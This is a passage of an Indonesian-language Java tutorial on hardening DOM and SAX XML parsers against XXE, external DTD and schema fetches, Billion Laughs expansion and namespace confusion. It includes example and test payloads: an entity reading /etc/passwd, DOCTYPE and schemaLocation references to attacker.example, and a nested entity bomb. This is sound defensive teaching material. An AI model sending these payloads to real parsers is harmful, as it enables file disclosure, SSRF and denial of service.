# Part 30 — Secure XML Parsing with DOM/SAX: XXE, Billion Laughs, Expansion Limits, Hardening

> Series: `learn-java-lang-dom-sax-core-runtime-platform-contracts`  
> File: `30-secure-xml-parsing-dom-sax-xxe-expansion-hardening.md`  
> Scope: Java 8–25, DOM, SAX, JAXP hardening, XML parser threat modelling  
> Status: Part 30 dari 32

---

## 1. Tujuan Part Ini

Pada part sebelumnya kita sudah membahas DOM sebagai **mutable tree model** dan SAX sebagai **push event model**. Part ini masuk ke wilayah yang lebih serius: **bagaimana memproses XML yang berasal dari luar sistem tanpa membuka celah security, denial-of-service, SSRF, file disclosure, parser confusion, atau resource exhaustion**.

Tujuan part ini:

1. memahami kenapa XML parser bisa menjadi attack surface;
2. memahami XXE, external entity, DTD, entity expansion, dan resource fetching;
3. membedakan problem **data disclosure**, **network pivoting/SSRF**, dan **DoS**;
4. memahami kenapa `FEATURE_SECURE_PROCESSING` penting tapi tidak cukup;
5. membuat hardened `DocumentBuilderFactory` untuk DOM;
6. membuat hardened `SAXParserFactory` / `XMLReader` untuk SAX;
7. memahami processing limits JDK/JAXP;
8. memahami Java 8–25 compatibility dan implementation differences;
9. membuat production checklist untuk semua XML entry point.

Setelah part ini, cara berpikirmu terhadap XML harus berubah dari:

```text
XML = format data yang tinggal diparse
```

menjadi:

```text
XML = executable-ish document format yang dapat meminta parser melakukan pekerjaan tambahan:
- resolve entity,
- fetch resource,
- expand text,
- validate grammar,
- allocate memory,
- traverse network/file system,
- dan membangun object/tree/event stream.
```

XML bukan code, tetapi XML parser dapat melakukan **effectful work** saat membaca XML. Itulah sumber risiko.

---

## 2. Mental Model Utama

### 2.1 XML parser bukan sekadar tokenizer

Parser XML modern bisa melakukan banyak hal selain membaca tag:

- membaca DTD;
- memproses entity declaration;
- mengganti entity reference dengan value entity;
- mengambil external DTD dari URL/file;
- mengambil external entity;
- melakukan validation;
- menerapkan schema;
- menggabungkan text;
- membangun tree DOM;
- memanggil handler SAX;
- memberi lokasi error;
- memakai resolver untuk resource lookup.

Artinya, input XML bisa mengontrol sebagian pekerjaan parser.

Mental model:

```text
Untrusted XML
   ↓
Parser configuration
   ↓
Resource resolution policy
   ↓
Entity processing policy
   ↓
Expansion / size / depth limits
   ↓
DOM tree or SAX events
   ↓
Application logic
```

Bug security biasanya muncul saat developer hanya memikirkan bagian akhir:

```text
DOM/SAX events → application logic
```

padahal attacker menyerang bagian awal:

```text
DTD/entity/resource resolution/expansion
```

---

### 2.2 XML security = policy, bukan satu flag

Tidak ada satu setting yang selalu cukup untuk semua skenario. Secure XML parsing adalah kombinasi policy:

1. apakah `DOCTYPE` boleh?
2. apakah DTD boleh diproses?
3. apakah external entity boleh?
4. apakah external schema boleh?
5. protokol apa yang boleh dipakai untuk external access?
6. seberapa besar entity expansion boleh terjadi?
7. seberapa dalam XML boleh nested?
8. seberapa besar input boleh diterima?
9. apakah parser harus validation-aware?
10. apakah resolver harus offline/local-only?

Dalam banyak aplikasi backend, policy paling aman adalah:

```text
Untrusted XML:
- jangan izinkan DOCTYPE;
- jangan izinkan external entity;
- jangan izinkan external DTD/schema fetch;
- batasi ukuran input sebelum parsing;
- aktifkan secure processing;
- gunakan resolver yang fail-closed;
- treat parse failure as rejected input, not retriable system failure.
```

---

### 2.3 DOM dan SAX punya risiko sama di lapisan parser

DOM dan SAX berbeda pada output model:

```text
DOM = tree in memory
SAX = event stream
```

Namun sebelum output itu muncul, keduanya memakai XML parser yang bisa:

- membaca DTD;
- resolve entity;
- expand entity;
- fetch external resource;
- menjalankan validation;
- mengalokasikan buffer.

Jadi hardening harus dilakukan pada factory/parser, bukan hanya pada cara membaca DOM/SAX.

---

## 3. Threat Model XML

### 3.1 Attack surface utama

XML parser dapat diserang lewat beberapa dimensi:

| Dimensi | Serangan | Dampak |
|---|---|---|
| External entity | XXE | file disclosure, SSRF, credential leakage |
| External DTD/schema | remote resource fetch | SSRF, latency, dependency ke network |
| Entity expansion | Billion Laughs / quadratic blowup | CPU/memory DoS |
| Deep nesting | recursive/tree exhaustion | stack/memory/time blowup |
| Huge text/attributes | memory pressure | OOM/GC pressure |
| Namespace confusion | wrong extraction | authorization/business logic bug |
| Validation resource | external schema fetch | SSRF/DoS |
| Error/logging | leaking input | sensitive data exposure |

Yang sering salah: developer mengira XXE hanya soal “membaca file”. Padahal XXE juga bisa menjadi **network pivot**.

---

### 3.2 XXE: XML External Entity

XXE terjadi ketika XML mendefinisikan entity yang menunjuk ke resource eksternal, lalu parser meng-expand entity tersebut.

Contoh konseptual:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<data>&secret;</data>
```

Jika parser mengizinkan external entity, isi file bisa masuk ke parsed document.

Pada DOM:

```text
<data>&secret;</data>
```

bisa berubah menjadi:

```text
<data>isi file lokal...</data>
```

Pada SAX, handler `characters()` bisa menerima konten hasil expansion.

Dampak:

- local file disclosure;
- metadata endpoint access, misalnya cloud metadata service jika network reachable;
- SSRF ke internal endpoint;
- port scanning via parser behavior;
- credential leakage jika resource berhasil dibaca lalu dipantulkan ke response/log/error.

---

### 3.3 External DTD fetch

Bahkan jika aplikasi tidak memakai entity value, parser dapat mencoba mengambil DTD eksternal:

```xml
<!DOCTYPE data SYSTEM "http://attacker.example/malicious.dtd">
<data>Hello</data>
```

Risiko:

- parser melakukan outbound HTTP;
- request berasal dari server internal;
- latency atau hang;
- dependency pada network;
- attacker melihat bahwa server melakukan fetch;
- attacker dapat mencoba SSRF.

Hardening external entity saja tidak selalu cukup. External DTD access juga harus dibatasi.

---

### 3.4 Billion Laughs / exponential entity expansion

Contoh konseptual:

```xml
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

Input kecil bisa menyebabkan output text sangat besar setelah expansion.

Dampak:

- memory exhaustion;
- CPU exhaustion;
- GC pressure;
- request thread blocked;
- service-level DoS.

---

### 3.5 Quadratic blowup

Tidak semua expansion harus exponential. Entity besar yang direferensikan berulang kali bisa membuat ukuran expansion meningkat besar dengan pola kuadratik.

Mental model:

```text
small XML syntax size ≠ small parse workload
```

Ukuran byte input bukan satu-satunya batas. Parser workload dapat jauh lebih besar dari ukuran file.

---

### 3.6 Namespace confusion sebagai security bug

Security XML tidak hanya parser resource access. Namespace confusion bisa menyebabkan aplikasi membaca elemen yang salah.

Contoh:

```xml
<user xmlns="urn:evil">
  <role>admin</role>
</user>
```

Jika kode hanya mencari `role` tanpa namespace awareness, aplikasi bisa salah menganggap elemen itu berasal dari namespace yang dipercaya.

Atau attacker memakai prefix berbeda:

```xml
<a:role xmlns:a="urn:trusted">admin</a:role>
```

Prefix bukan identitas. Namespace URI adalah identitas.

---

## 4. Prinsip Defensive XML Parsing

### 4.1 Default stance untuk untrusted XML

Untuk input dari user, partner, upload file, API eksternal, message queue, email attachment, atau sistem yang tidak sepenuhnya controlled:

```text
Default policy:
1. reject DOCTYPE;
2. disable external general entities;
3. disable external parameter entities;
4. disable external DTD loading;
5. restrict external access to empty protocol list;
6. enable secure processing;
7. set parser limits;
8. cap input size before parsing;
9. parse namespace-aware;
10. fail closed when feature unsupported.
```

Fail closed artinya:

```text
Jika parser tidak bisa diset aman, jangan parse input.
```

Bukan:

```text
Jika setFeature gagal, log warning lalu lanjut.
```

---

### 4.2 Trusted XML bukan berarti bebas

“Trusted” sering ambigu.

Pertanyaan yang harus dijawab:

- trusted oleh siapa?
- generated oleh sistem sendiri atau partner?
- apakah jalur transport aman?
- apakah payload bisa dimanipulasi replay/proxy?
- apakah XML disimpan lama lalu diproses ulang oleh versi parser berbeda?
- apakah XML bisa membawa reference ke resource internal?

Untuk XML internal sekalipun, resource limits tetap penting. Bug generator internal juga bisa menghasilkan payload buruk.

---

### 4.3 Ukuran input harus dibatasi sebelum parser

Parser hardening tidak menggantikan input size limit.

Contoh policy:

```text
- API request XML max 1 MB;
- batch XML max 100 MB but streaming only;
- DOM only for <= 5 MB after decompression;
- compressed upload must have decompressed size cap;
- reject nested archive/XML bombs before parser.
```

Kenapa?

Karena DOM membangun tree penuh. File XML 20 MB bisa menjadi object graph jauh lebih besar di heap.

---

## 5. DOM Hardening dengan `DocumentBuilderFactory`

### 5.1 Factory hardening baseline

Contoh utility production-oriented:

```java
package com.example.xml;

import org.w3c.dom.Document;
import org.xml.sax.EntityResolver;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

public final class SecureDom {
    private SecureDom() {}

    public static Document parse(InputStream input)
            throws ParserConfigurationException, IOException, SAXException {

        DocumentBuilderFactory factory = newSecureDocumentBuilderFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();

        // Defense-in-depth. If any external entity slips through, fail closed.
        builder.setEntityResolver(disallowingEntityResolver());

        return builder.parse(input);
    }

    public static DocumentBuilderFactory newSecureDocumentBuilderFactory()
            throws ParserConfigurationException {

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Correctness and security: namespace-aware parsing prevents prefix/local-name confusion.
        factory.setNamespaceAware(true);

        // Do not validate untrusted XML unless validation is explicitly required and hardened.
        factory.setValidating(false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        // General secure processing flag: enables implementation-defined security limits.
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

        // Strongest position: reject any DOCTYPE declaration for untrusted XML.
        setFeatureStrict(factory, "http://apache.org/xml/features/disallow-doctype-decl", true);

        // Defense in depth for entity processing.
        setFeatureStrict(factory, "http://xml.org/sax/features/external-general-entities", false);
        setFeatureStrict(factory, "http://xml.org/sax/features/external-parameter-entities", false);
        setFeatureStrict(factory, "http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // Standard JAXP external access restrictions. Empty string = no protocol allowed.
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        // JDK-specific processing limits. Tune for your domain.
        factory.setAttribute("jdk.xml.entityExpansionLimit", "0");
        factory.setAttribute("jdk.xml.maxElementDepth", "128");
        factory.setAttribute("jdk.xml.totalEntitySizeLimit", "0");

        return factory;
    }

    private static void setFeatureStrict(DocumentBuilderFactory factory,
                                         String feature,
                                         boolean value)
            throws ParserConfigurationException {
        factory.setFeature(feature, value);
    }

    private static EntityResolver disallowingEntityResolver() {
        return (publicId, systemId) -> {
            throw new SAXException("External entity resolution is disabled: " + systemId);
        };
    }
}
```

Catatan penting:

- `disallow-doctype-decl=true` biasanya membuat DOCTYPE ditolak sepenuhnya;
- `external-general-entities=false` dan `external-parameter-entities=false` mencegah entity eksternal;
- `load-external-dtd=false` mencegah parser mengambil external DTD non-validating;
- `ACCESS_EXTERNAL_DTD=""` dan `ACCESS_EXTERNAL_SCHEMA=""` membatasi external access di level JAXP standard;
- entity resolver fail-closed adalah defense-in-depth.

---

### 5.2 Kenapa `setExpandEntityReferences(false)` tidak cukup

Banyak developer mengira ini cukup:

```java
factory.setExpandEntityReferences(false);
```

Problemnya:

- behavior bisa berbeda antar implementation;
- ini tidak selalu mencegah parser membaca DTD/entity;
- ini tidak menggantikan larangan external access;
- ini tidak selalu mencegah DTD fetch;
- ini lebih berkaitan dengan representasi `EntityReference` node pada DOM.

Jangan jadikan ini satu-satunya defense.

---

### 5.3 Fail-closed feature setting

Ini buruk:

```java
try {
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
} catch (ParserConfigurationException e) {
    log.warn("Feature not supported");
}
```

Kenapa buruk?

Karena jika feature tidak didukung, parser tetap dipakai dalam keadaan mungkin tidak aman.

Lebih baik:

```java
try {
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
} catch (ParserConfigurationException e) {
    throw new IllegalStateException("XML parser cannot be securely configured", e);
}
```

Dalam production security, unsupported security feature bukan warning. Itu configuration failure.

---

### 5.4 Kapan DOCTYPE boleh?

Untuk sebagian sistem legacy, DTD mungkin diperlukan. Jika DOCTYPE wajib diterima, policy harus lebih sempit:

```text
- jangan fetch remote DTD;
- gunakan local catalog/static resolver;
- allowlist public/system ID tertentu;
- matikan external general entity;
- batasi parameter entity;
- batasi expansion;
- batasi ukuran;
- audit resolver access;
- test payload malicious.
```

Contoh resolver allowlist:

```java
public final class AllowlistedDtdResolver implements EntityResolver {
    @Override
    public InputSource resolveEntity(String publicId, String systemId) throws SAXException {
        if ("-//Example//DTD Safe 1.0//EN".equals(publicId)) {
            InputStream dtd = getClass().getResourceAsStream("/dtd/safe-v1.dtd");
            if (dtd == null) {
                throw new SAXException("Bundled DTD not found");
            }
            InputSource source = new InputSource(dtd);
            source.setPublicId(publicId);
            source.setSystemId("classpath:/dtd/safe-v1.dtd");
            return source;
        }
        throw new SAXException("DTD is not allowlisted: " + systemId);
    }
}
```

Rule penting:

```text
Resolver yang aman bukan resolver yang “mengembalikan empty string untuk semua”.
Resolver yang aman harus jelas: allowlist atau reject.
```

---

## 6. SAX Hardening dengan `SAXParserFactory` dan `XMLReader`

### 6.1 Factory hardening baseline

```java
package com.example.xml;

import org.xml.sax.EntityResolver;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.DefaultHandler;

import javax.xml.XMLConstants;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.IOException;
import java.io.InputStream;

public final class SecureSax {
    private SecureSax() {}

    public static void parse(InputStream input, DefaultHandler handler)
            throws ParserConfigurationException, SAXException, IOException {

        SAXParserFactory factory = newSecureSaxParserFactory();
        SAXParser parser = factory.newSAXParser();
        XMLReader reader = parser.getXMLReader();

        reader.setEntityResolver(disallowingEntityResolver());
        reader.setContentHandler(handler);
        reader.setErrorHandler(handler);

        reader.parse(new InputSource(input));
    }

    public static SAXParserFactory newSecureSaxParserFactory()
            throws ParserConfigurationException, SAXException {

        SAXParserFactory factory = SAXParserFactory.newInstance();
        factory.setNamespaceAware(true);
        factory.setValidating(false);

        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // Standard JAXP properties on SAXParserFactory may be set through parser property
        // depending on implementation/version. Prefer also setting on XMLReader when available.
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

        // JDK-specific limits.
        factory.setProperty("jdk.xml.entityExpansionLimit", "0");
        factory.setProperty("jdk.xml.maxElementDepth", "128");
        factory.setProperty("jdk.xml.totalEntitySizeLimit", "0");

        return factory;
    }

    private static EntityResolver disallowingEntityResolver() {
        return (publicId, systemId) -> {
            throw new SAXException("External entity resolution is disabled: " + systemId);
        };
    }
}
```

Catatan:

- SAX output streaming tidak otomatis aman dari XXE;
- entity expansion terjadi sebelum handler menerima text;
- `characters()` bisa menerima hasil expansion;
- resolver tetap perlu fail-closed;
- namespace-aware tetap penting.

---

### 6.2 XMLReader-level defense

Kadang property/feature lebih reliable jika diset langsung di `XMLReader` setelah parser dibuat:

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setNamespaceAware(true);
factory.setValidating(false);
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

SAXParser parser = factory.newSAXParser();
XMLReader reader = parser.getXMLReader();

reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
reader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

reader.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
reader.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

Production wrapper bisa melakukan dua lapis:

1. set pada factory;
2. set pada reader;
3. fail jika ada security feature yang tidak bisa diset.

---

## 7. `XMLConstants.FEATURE_SECURE_PROCESSING`

### 7.1 Apa gunanya?

`XMLConstants.FEATURE_SECURE_PROCESSING` memberi instruksi kepada implementation agar memproses XML secara aman, biasanya dengan mengaktifkan limit tertentu untuk mencegah resource exhaustion.

Contoh:

```java
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
```

Gunakan ini, tetapi jangan berhenti di sini.

---

### 7.2 Kenapa tidak cukup?

Karena secure processing:

- implementation-dependent;
- lebih fokus pada processing limits;
- tidak selalu berarti semua external access dimatikan;
- tidak menggantikan `ACCESS_EXTERNAL_DTD`;
- tidak menggantikan `ACCESS_EXTERNAL_SCHEMA`;
- tidak menggantikan larangan DOCTYPE;
- tidak menggantikan resolver fail-closed.

Mental model:

```text
FEATURE_SECURE_PROCESSING = seatbelt
External access restrictions = door lock
Disallow DOCTYPE/entity = remove dangerous feature
Input size limit = speed limit
Resolver fail-closed = security guard
```

Seatbelt penting, tetapi tidak cukup.

---

## 8. External Access Restrictions

### 8.1 `ACCESS_EXTERNAL_DTD`

`XMLConstants.ACCESS_EXTERNAL_DTD` mengontrol protokol yang boleh dipakai untuk external DTD/entity access.

Contoh paling aman:

```java
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
```

Empty string berarti tidak ada protokol yang diizinkan.

Contoh yang lebih longgar:

```java
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "file");
```

Ini mengizinkan file access, biasanya tidak cocok untuk untrusted XML.

---

### 8.2 `ACCESS_EXTERNAL_SCHEMA`

Untuk schema validation:

```java
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

Jika schema validation perlu external schema, sebaiknya gunakan local catalog/allowlist, bukan network fetch bebas.

---

### 8.3 External stylesheet boundary

Part ini fokus DOM/SAX, tetapi XML sering masuk ke XSLT. Untuk TransformerFactory, ada:

```java
transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

Jika XML pipeline memakai transform, hardening parser saja tidak cukup. Semua processor XML harus hardened.

---

## 9. Processing Limits

### 9.1 Kenapa limit perlu?

Disabling external resource tidak cukup untuk mencegah semua DoS. Input lokal bisa tetap menyebabkan:

- entity expansion;
- nested element explosion;
- huge attributes;
- huge text node;
- many attributes;
- large name table;
- high memory pressure.

JAXP/JDK menyediakan processing limits. Beberapa bersifat JDK-specific.

Contoh property yang sering relevan:

```text
jdk.xml.entityExpansionLimit
jdk.xml.totalEntitySizeLimit
jdk.xml.maxGeneralEntitySizeLimit
jdk.xml.maxParameterEntitySizeLimit
jdk.xml.maxElementDepth
jdk.xml.elementAttributeLimit
jdk.xml.maxXMLNameLimit
```

Nilai harus ditentukan berdasarkan domain, bukan copy-paste tanpa pikir.

---

### 9.2 Contoh limit policy

Untuk XML API kecil:

```text
max request size: 1 MB
max element depth: 64
entity expansion: 0
total entity size: 0
DTD: disabled
external access: none
DOM allowed: yes
```

Untuk batch XML besar:

```text
max decompressed size: 100 MB
parser model: SAX
max element depth: 128
DTD: disabled unless business requires
external access: none
DOM full tree: no
per-record failure isolation: yes
```

Untuk legacy DTD-required XML:

```text
max input size: explicit
DTD: allowlisted only
external access: none/network disabled
local catalog: yes
entity expansion limit: low and tested
schema: local only
resolver audit: yes
```

---

### 9.3 Jangan menaikkan limit tanpa threat analysis

Jika muncul error seperti:

```text
entity expansion limit exceeded
```

reaksi buruk:

```text
Naikkan limit besar-besaran supaya error hilang.
```

Reaksi benar:

```text
1. Apakah XML memang valid business payload?
2. Kenapa butuh entity sebanyak itu?
3. Apakah DTD/entity memang harus diizinkan?
4. Apakah parser model salah? DOM vs SAX?
5. Apakah payload malicious atau bug generator?
6. Berapa batas aman berdasarkan memory/time budget?
```

Security limit adalah bagian dari contract, bukan obstacle.

---

## 10. Secure DOM Utility: Versi Lebih Production-Oriented

Berikut contoh desain utility yang lebih rapi.

```java
package com.example.xml.secure;

import org.w3c.dom.Document;
import org.xml.sax.EntityResolver;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import java.io.InputStream;

public final class SecureXmlDomParser {
    private final int maxElementDepth;

    public SecureXmlDomParser(int maxElementDepth) {
        if (maxElementDepth <= 0) {
            throw new IllegalArgumentException("maxElementDepth must be positive");
        }
        this.maxElementDepth = maxElementDepth;
    }

    public Document parse(InputStream input) throws SecureXmlParseException {
        try {
            DocumentBuilderFactory factory = newFactory();
            DocumentBuilder builder = factory.newDocumentBuilder();
            builder.setEntityResolver(rejectAllExternalEntities());
            return builder.parse(input);
        } catch (ParserConfigurationException e) {
            throw new SecureXmlParseException("XML parser is not securely configurable", e);
        } catch (SAXException e) {
            throw new SecureXmlParseException("XML is rejected or malformed", e);
        } catch (IOException e) {
            throw new SecureXmlParseException("Failed to read XML input", e);
        }
    }

    private DocumentBuilderFactory newFactory() throws ParserConfigurationException {
        DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
        f.setNamespaceAware(true);
        f.setValidating(false);
        f.setXIncludeAware(false);
        f.setExpandEntityReferences(false);

        f.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        f.setFeature("http://xml.org/sax/features/external-general-entities", false);
        f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        f.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        f.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        f.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        f.setAttribute("jdk.xml.entityExpansionLimit", "0");
        f.setAttribute("jdk.xml.totalEntitySizeLimit", "0");
        f.setAttribute("jdk.xml.maxElementDepth", Integer.toString(maxElementDepth));

        return f;
    }

    private static EntityResolver rejectAllExternalEntities() {
        return (publicId, systemId) -> {
            throw new SAXException("External entity is not allowed");
        };
    }
}
```

Exception wrapper:

```java
package com.example.xml.secure;

public final class SecureXmlParseException extends Exception {
    public SecureXmlParseException(String message, Throwable cause) {
        super(message, cause);
    }
}
```

Kenapa checked exception? Karena parsing XML dari luar adalah boundary operation yang validly fails.

Namun di service layer bisa diterjemahkan menjadi domain/API rejection:

```text
400 Bad Request / INVALID_XML
```

bukan:

```text
500 Internal Server Error
```

kecuali parser configuration gagal saat startup.

---

## 11. Secure SAX Utility dengan Explicit State Boundary

```java
package com.example.xml.secure;

import org.xml.sax.EntityResolver;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.DefaultHandler;

import javax.xml.XMLConstants;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.IOException;
import java.io.InputStream;

public final class SecureXmlSaxParser {
    private final int maxElementDepth;

    public SecureXmlSaxParser(int maxElementDepth) {
        if (maxElementDepth <= 0) {
            throw new IllegalArgumentException("maxElementDepth must be positive");
        }
        this.maxElementDepth = maxElementDepth;
    }

    public void parse(InputStream input, DefaultHandler handler) throws SecureXmlParseException {
        try {
            SAXParserFactory factory = newFactory();
            SAXParser parser = factory.newSAXParser();
            XMLReader reader = parser.getXMLReader();

            hardenReader(reader);
            reader.setEntityResolver(rejectAllExternalEntities());
            reader.setContentHandler(handler);
            reader.setErrorHandler(handler);
            reader.parse(new InputSource(input));
        } catch (ParserConfigurationException | SAXException e) {
            throw new SecureXmlParseException("XML parser rejected input or cannot be securely configured", e);
        } catch (IOException e) {
            throw new SecureXmlParseException("Failed to read XML input", e);
        }
    }

    private SAXParserFactory newFactory() throws ParserConfigurationException, SAXException {
        SAXParserFactory f = SAXParserFactory.newInstance();
        f.setNamespaceAware(true);
        f.setValidating(false);

        f.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        f.setFeature("http://xml.org/sax/features/external-general-entities", false);
        f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        f.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        setProperty(f, XMLConstants.ACCESS_EXTERNAL_DTD, "");
        setProperty(f, XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        setProperty(f, "jdk.xml.entityExpansionLimit", "0");
        setProperty(f, "jdk.xml.totalEntitySizeLimit", "0");
        setProperty(f, "jdk.xml.maxElementDepth", Integer.toString(maxElementDepth));

        return f;
    }

    private void hardenReader(XMLReader reader) throws SAXException {
        reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
        reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        reader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        reader.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        reader.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
        reader.setProperty("jdk.xml.entityExpansionLimit", "0");
        reader.setProperty("jdk.xml.totalEntitySizeLimit", "0");
        reader.setProperty("jdk.xml.maxElementDepth", Integer.toString(maxElementDepth));
    }

    private static void setProperty(SAXParserFactory factory, String property, String value)
            throws SAXException {
        factory.setProperty(property, value);
    }

    private static EntityResolver rejectAllExternalEntities() {
        return (publicId, systemId) -> {
            throw new SAXException("External entity is not allowed");
        };
    }
}
```

Catatan compatibility:

- Beberapa parser/versi mungkin tidak mendukung semua property;
- untuk security-sensitive code, unsupported property harus menyebabkan startup failure atau parser factory rejection;
- jangan diam-diam fallback ke parser tidak aman.

---

## 12. Hardening Saat Schema Validation Diperlukan

### 12.1 Schema validation menambah attack surface

Jika memakai XSD:

```java
SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
```

hardening juga perlu dilakukan pada `SchemaFactory`:

```java
schemaFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

Jika schema diambil dari file/classpath controlled:

```java
Schema schema = schemaFactory.newSchema(
    SecureXml.class.getResource("/schema/trusted.xsd")
);
```

Jangan biarkan XML instance menentukan schema location dari network.

---

### 12.2 `xsi:schemaLocation` trap

XML dapat berisi:

```xml
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="urn:trusted http://attacker.example/schema.xsd">
</root>
```

Jika parser/validator mengambil schema dari lokasi tersebut, ini menjadi external resource fetch.

Policy aman:

```text
Schema location dari input tidak dipercaya.
Schema harus dipilih oleh aplikasi berdasarkan trusted context.
```

---

## 13. Testing Payloads

### 13.1 Test DOCTYPE rejection

```java
String xml = """
    <?xml version="1.0"?>
    <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <root>&xxe;</root>
    """;

assertRejected(xml);
```

Expected:

```text
parse fails before application reads expanded content
```

---

### 13.2 Test external DTD rejection

```java
String xml = """
    <?xml version="1.0"?>
    <!DOCTYPE root SYSTEM "http://127.0.0.1:9999/evil.dtd">
    <root>Hello</root>
    """;

assertRejected(xml);
```

Expected:

```text
no outbound network request
parse rejected
```

Untuk test serius, jalankan local mock server dan pastikan request count = 0.

---

### 13.3 Test entity expansion

```java
String xml = """
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    ]>
    <root>&lol2;</root>
    """;

assertRejected(xml);
```

Jika DOCTYPE disabled, payload harus gagal lebih awal.

---

### 13.4 Test namespace correctness

```java
String xml = """
    <payment xmlns="urn:evil">
      <amount>999999</amount>
    </payment>
    """;
```

Extractor aman harus mencari:

```java
getElementsByTagNameNS("urn:trusted:payment", "amount")
```

bukan:

```java
getElementsByTagName("amount")
```

---

### 13.5 Test compressed bomb boundary

Jika sistem menerima zip/gzip XML:

```text
compressed size kecil ≠ decompressed size kecil
```

Test:

- gzip XML besar;
- zip berisi XML besar;
- nested archive;
- many small XML files;
- invalid compression stream.

Batas harus ada sebelum XML parser menerima stream tak terbatas.

---

## 14. Production Input Boundary Pattern

### 14.1 Jangan parse langsung dari request stream tanpa limit

Buruk:

```java
Document doc = secureDomParser.parse(request.getInputStream());
```

Lebih baik:

```java
InputStream limited = new BoundedInputStream(request.getInputStream(), maxBytes);
Document doc = secureDomParser.parse(limited);
```

Atau baca ke temp file dengan quota untuk batch besar.

---

### 14.2 Normalize error menjadi rejection

